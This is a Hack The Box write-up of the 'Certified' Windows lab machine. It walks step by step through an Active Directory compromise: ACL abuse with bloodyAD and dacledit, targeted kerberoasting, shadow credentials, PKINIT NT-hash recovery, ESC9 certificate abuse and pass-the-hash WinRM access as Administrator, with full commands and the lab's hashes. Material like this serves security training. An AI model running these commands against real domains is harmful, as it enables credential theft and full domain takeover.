---
title: "Certified"
date: 2025-08-22 15:13:00 +0500
categories: [Boxes]
tags: [HTB, Box, Windows, Medium]
---

## Box Creds

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09

## Recon

### Port Discovery

```bash
┌──(kali㉿vm-kali)-[~/htb/certified]
└─$ rustscan -a 10.10.11.41 --ulimit 5000

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49722/tcp open  unknown          syn-ack ttl 127
49731/tcp open  unknown          syn-ack ttl 127
49774/tcp open  unknown          syn-ack ttl 127
```

After running a script and version scan on all the listening ports, we can ensure that it's an AD Box.

The domain is `certified.htb` and the DC is `DC01.certified.htb`.

We start with creds. We have SMB service running we will try the creds. 

### SMB Enumeration

```bash
smbmap -H 10.10.11.41 -u judith.mader -p judith09 -d certified.htb         

<SNIP>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.41:445 Name: 10.10.11.41               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

No share of interest, let's list all the users:

### User Enumeration (LDAP)

```bash
netexec ldap DC01.certified.htb -u judith.mader -p 'judith09' --users                                                      
LDAP        10.10.11.41     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.10.11.41     389    DC01             [*] Enumerated 9 domain users: certified.htb
LDAP        10.10.11.41     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.41     389    DC01             Administrator                 2024-05-13 19:53:16 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.41     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.41     389    DC01             krbtgt                        2024-05-13 20:02:51 0        Key Distribution Center Service Account                     
LDAP        10.10.11.41     389    DC01             judith.mader                  2024-05-15 00:22:11 0                                                                    
LDAP        10.10.11.41     389    DC01             management_svc                2024-05-13 20:30:51 0                                                                    
LDAP        10.10.11.41     389    DC01             ca_operator                   2024-05-13 20:32:03 0                                                                    
LDAP        10.10.11.41     389    DC01             alexander.huges               2024-05-14 21:39:08 0                                                                    
LDAP        10.10.11.41     389    DC01             harry.wilson                  2024-05-14 21:39:37 0                                                                    
LDAP        10.10.11.41     389    DC01             gregory.cameron               2024-05-14 21:40:05 0 
```

We will go with Bloodhound. 

### Enumerating with Bloodhound

```bash
sudo neo4j console
bloodhound

bloodhound-python --dns-tcp -ns 10.10.11.41 -d certified.htb -u 'judith.mader' -p 'judith09' -c all

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 23S
```

![alt text](/assets/images/certified-writeOwner.png)

- Judith has WriteOwner perms over `management` group.
- `management_svc` is a member of the `management` group.
- `management` group members has `GenericWrite` over `management_svc`.
- `management_svc` has `GenericAll` on `CA_Operator` user.

Let's abuse the WriteOwner permission. 

## Foothold

### WriteOwner

```bash
bloodyAD --host DC01.certified.htb -d certified.htb -u judith.mader -p 'judith09' set owner Management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management
```

Since we are the owner, we can manipulate the group. 
But since we as a member of this group has `GenericWrite` over `management_svc` user we will do a targeted kerberoast attack. 

### GenericWrite (TargetedKerberoast)

```bash
python3 targetedKerberoast.py -v -d 'certified.htb' -u judith.mader -p judith09
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$34bcc72c91139759f56692c698a2c9ae$c74204bf7cf7f7b1ae5c9c8e804ce65f6b41321e7c542582efd1e9e60ff8fd266c8d5019f76fe9ec8bb871c65b06cbd33cf1961fdfb93d5351cd63f0447aaae6732538a395703a00326672c77eb358854633cd8dead2e472fc091bc0598554bfc656e17e4f515b08d99f1045aabc8cd37a401f1384b3665104dded0c9f7c0088cbcf3eea9423a0aa283a20353226f94c261064a3882d3f8d6e7af840535301f2f39283f97dc6e42439943067f7ba4e9a3634d96ed1fbd3400cecd6cb3282f495ccf6a6295b481981d64cb993de5386413ab8b8f569936886d854e532cd20d224ecef1b94a543e73b35fcda01898b687e4cd0b3802db4ea5921b008ff5058a4ac7ba94f90c35d69cef917f4254c80b217e65c98ad97064671ac58ef483fd157c9452f7a7d7ce59b9c750ee0c38e6ef3b72ff7bae1206e43039943559a10f84936a68cd06ef4eec085bae5584aab3866ffa5b09b1379a275a4289effc9f9c7e597743648a857e104e4bc43d82782c3ea2ce6731e877130dd3317433c56f29fb1677872fb00ac48a135993124907f61e5e73a59254261374dd25cf02e8d3e0b4d0c22a9b2a90a9fda59058e3ae12d1fba3231a303df55c2225024742221f1ba4e1980a56acba7e79be5b6223d4e1e397f448c6023d250667d09a1184b1d1002fcf2c3bc17b457757acf07a1fd405a9b625f7f950172e3915cfa57749dbb2021705109964beac0f9887d689c61c108fc2c6e1df4435b224526fea3a358379b8a2c886ae49f6e832199536b8bc5848eb8266571fa0212a7a1491c6fbf9a700359443cdb34a24fb92795e946c85235bbf99a7b5b0750e87dde48387c2fc63d17cd92c4bb6119e18abe427405f56b6f02a707795299d5a50bab80ac0099b631827abfca14dc8b3616dd40489befdf85efa7e207bcaf565e4c97c461a9655b9e36c9182fceaf7c77c0a32abc9a39cc9a0f0c1d1e3cb78c4740af9c24177d6b880aedc7f2909528475bf4320c917a83fec84884448c1ee31d5591d59da58f3a8fcd58a4ad4bec439e5dd8a3fa7db10bab54e68027451af5287e44baef0f6dbac287e788cc4cd296a351498b97489532ea2e79e1caf084a03d3dd0d5167fac3101527261905905b0fc0c312d22b292fe32b13acfd632bb45aa2c2c6022d6151409c17848cc47e998ee91f8ab082653e1a99d53d65c2611cee65ba61608da17755a659e4ecbfa3642cf50dba73dc2b236b91e7695b08253d8de0071372a8894fb380f84157ace58e299af43cfe0bb87d6b54d4ef8be7c7307c12f137666e193421c120511f6a0d9ba29af39faa02a113cb14aee7fabeb7b9fa90fdb0c8862a1cb2ae365cef9302befda3c8d171b2233972f418815d59843aa396632643f72886dcdb217c377bd2ec90470fcfde3133b3447678938efe24ac4703d716ef7a3dc2472b3063cd9e4d5f14bce3320aeeda0bc5c44bec03091ff157e13a92db3b16c2f9c8579f43c0193988161666f113666f2dd0c309bfe4c2927120b25cb13bb7e96953f4865af465c91f591c4ccc785e6adb3866b34bb745fa6ba2dfe815abb59
```

I wasn't able to crack the krb5 tgs ticket.

I tried pywhisker and realized I haven't given `judith.mader` the necessary rights. 

### Impacket-dacledit

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":"judith09"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250823-101614.bak
[*] DACL modified successfully!
```

We give our controlled user FullControl over the group, and since we enabled the inheritance flag every member inside OU is now controlled by our controlled user.

### Adding to Group (bloodyAD)

Now we add our controlled user to the group.

```bash
bloodyAD --host DC01.certified.htb -d certified.htb -u judith.mader -p 'judith09' add groupMember management judith.mader
[+] judith.mader added to management
```

### Shadow Credentials Attack (pywhisker)

```bash
python3 pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --target "Management_svc" --action 'add'
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 95f914b1-b886-2479-83db-6b6fc59f8f41
[*] Updating the msDS-KeyCredentialLink attribute of Management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: mxvdKRzI.pfx
[+] PFX exportiert nach: mxvdKRzI.pfx
[i] Passwort für PFX: etvldA5EJgSwU3a3WWv5
[+] Saved PFX (#PKCS12) certificate & key at path: mxvdKRzI.pfx
[*] Must be used with password: etvldA5EJgSwU3a3WWv5
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

We were now able to successfully able to run pywhisker using our controlled user against the target. Time to get TGT.

### PKINIT (getTGT)

```bash
python3 gettgtpkinit.py -cert-pfx ../mxvdKRzI.pfx -pfx-pass 'etvldA5EJgSwU3a3WWv5' certified.htb/management_svc management_svc.ccache
2025-08-23 10:27:44,366 minikerberos INFO     Loading certificate and key from file
2025-08-23 10:27:44,384 minikerberos INFO     Requesting TGT
2025-08-23 10:27:51,401 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-08-23 10:27:51,402 minikerberos INFO     6e6d4bc88571b01520ddb13587b53a9d9edcedde8377e7b21a08f2cd1d3050d1
2025-08-23 10:27:51,406 minikerberos INFO     Saved TGT to file
```

Let's get the NT Hash

### PKINIT (getNTHash)

```bash
export KRB5CCNAME=../management_svc.ccache

python3 getnthash.py -key 6e6d4bc88571b01520ddb13587b53a9d9edcedde8377e7b21a08f2cd1d3050d1 certified.htb/management_svc
/home/kali/htb/certified/PKINITtools/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

We have the NT hash! No need to crack it, we can just winrm with it.

### WinRM as management_svc

```powershell
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

*Evil-WinRM* PS C:\Users\management_svc\Documents> type ..\Desktop\user.txt
```

## Privilege Escalation

Since we as `management_svc` have `GenericAll` over `CA_Operator` we will first start by abusing that.

One way to abuse is again targetedKerberoast.

### TargetedKerberoast

```bash
python3 targetedKerberoast.py -v -d 'certified.htb' -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

[+] Printing hash for (ca_operator)
$krb5tgs$23$*ca_operator$CERTIFIED.HTB$certified.htb/ca_operator*$bc51a2491dd97dd987019e2db963cbea$7d3045868b7a69b9a29cfabbe76726f2eb4bed062644c2d1bc8fb803774221b78fbce77b726295fe3152ec11c3128475dd0e5e53ad19122a3bd2f7c88175d71bd97eb64afeddbf6a49efe8c600e69b621a301122032e85c0a3a97148bbbae997e78635d7590a1371ca52d03a9131646e92e4f300fbfb51b1cbab7dc99e072e291a76e6db4fcf31f91de14be75cd7e20125af977c35499f4a7d00cfdfd44af3ba4f263618328da47f76ad87b8f28d56344a0cb38bfbf0da83a36183c8eafd1235ae9aead869db89a125df04b339882f4c53441d3115935b43e3c0bc52fd4cadc0b78540cafdf18879d99c6b0339e4c63714846156d62437abcdf363daf4129ed0905020d1d9162165b33f42d241872d36422b28df19cb601870400718621910ba6ce1d0ec55711a7c3dbc7960bcd2bc27f211e1e90da1d2da56793e21403d4d05a61912903a6aa74509e91f8a5c670af882ad9cf557f5f9678bbc0b641f7269603bccbdc8d601fc8c1cdd2e3c4b2c4f3d1703ba4f0e2dce430d0a8ed2fa2a3168cd0b78834b7894866e688b75c52246f88e2076aa1c590d5899148d89a7c2d7e79aac449939869bad964c99235114998daf00d82f967ebcef4e4a124ca5d27df7c58b40aa262f5a27708f509f3d9cddd0177770fb8587912efc4006bf324f971cb1ccd080b6129c21ca81d71b06f48a86e5bcf57bf764ccfdf61f2e6f8fbd95e7e904ef7b8fad5855812f5367114d9a0a78ba20c58a7f7b3c74a5c27874cc73e4f413d3386288a939d1069d5dfa30987d4b024b6092c7526fe0eca344e7f3d873917a731ad7f4e581d4ded08921d01e650db26a0728ffcbef0f93ec30bdb17a952acdf5a9e0b43cab3b030002e516674decac0fbc92d7bb5a45d99c77363385d6d3dde53ebd26d2be07ae1ef16a3076c853c159dfed4f054b43a8784662114f3f179c9eadee25aa9e3693f89c41f3bb6691157fa5dec3b41dd3627f4af87fe6ec4b8f1119e76d81292f8dabbb9eb6501f49da30e06b5243a5b40d6d7f4b9b4bce245a9c3e91cbf97ca6baad2c33b696ce2121bc36e31d2aeb7ce7590d89399b271860689ba9e862a5416e58a0a3a76c94502716514b4444a80e2f8057b1530b335a76d82be4b8feca0cbbab60cdc706cdafafe321dff769981ec8a482d798342514f944aa0eeee31ecb87ae65c415646b0cfd8acdc01c219f4aeada74a297d4e46a65b3c62981f2efb190dc41ae230d278610d20988ca91c19758380a67a8e78bac5455facc7358ab1fce0c705d2957e12a24a665c9b547019364911c952eae1c63ad983d5ec618812ed4fd21a3fe30909f56d6ab31c56c2beefbcc2b026d96e8f0cb61a3f1115a40fbbfdf8bb55ddf78c8dab37f8e80b190f3f1e8ac651c8923dce8048df6c5c32b6a19417c7ce88236b99aed708a80460a0035fde2c9f2c05314a3fd6242a5fa38400b26e6d591343a8660f4d83b453b870c29a4e90d9779c7b177a7f5fbb10719fc527f22b65650b25e9b13f0607d1e51b25c5781a5de0e19f195d3fb953fe613e6d7794d88dc4b613414ccc5e639b35499e9d3901a9ed93ffc325cb94e1d0eda8c8aa7591ea07b9c1cbdc45c44eacb15cdbe2e22
```

But again we won't be able to use it since we aren't able to crack it. We can also do Shadow Credential attack with PyWhisker. Or simply we could Force Change Password of the user.

### Force Change Password

```bash
bloodyAD --dc-ip 10.10.11.41 -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 set password ca_operator 'Password123!'
[+] Password changed successfully!
```

Since we now own the CA_Operator account we will start by enumerating for any potential vulnerability in the Certificate Authority.

### Enumerating with Certipy

```bash
certipy-ad find -u 'ca_operator@certified.htb' -p 'Password123!' -dc-ip 10.10.11.41 -text -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

<SNIP>
[*] Saving text output to '20250823104613_Certipy.txt'
[*] Wrote text output to '20250823104613_Certipy.txt'
```

Let's analyze the output

```bash
<SNIP>
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

Our target is vulnerable to ESC9. 

## ESC9

[ESC9](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template)

### Update CA_Operator UPN as Management_SVC

```bash
certipy-ad account -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -upn 'Administrator' -user 'ca_operator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

We have updated CA_Operator to have UPN of Administrator.

### Request Certificate as CA_Operator

Time to request a certificate as CA_Operator

```bash
┌──(kali㉿vm-kali)-[~/htb/certified]
└─$ impacket-getTGT certified.htb/ca_operator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in ca_operator.ccache
                                                                                                                                                           
┌──(kali㉿vm-kali)-[~/htb/certified]
└─$ export KRB5CCNAME=ca_operator.ccache

certipy-ad req -k -dc-ip 10.10.11.41 -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Revert CA_Operator UPN

Be sure to revert the `ca_operator` UPN:

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb                                                                              

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

### Auth with the PFX

We have the administrator hash now:

```bash
certipy-ad auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## WinRM as Administrator

```bash
evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby3.1: no such file or directory
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---
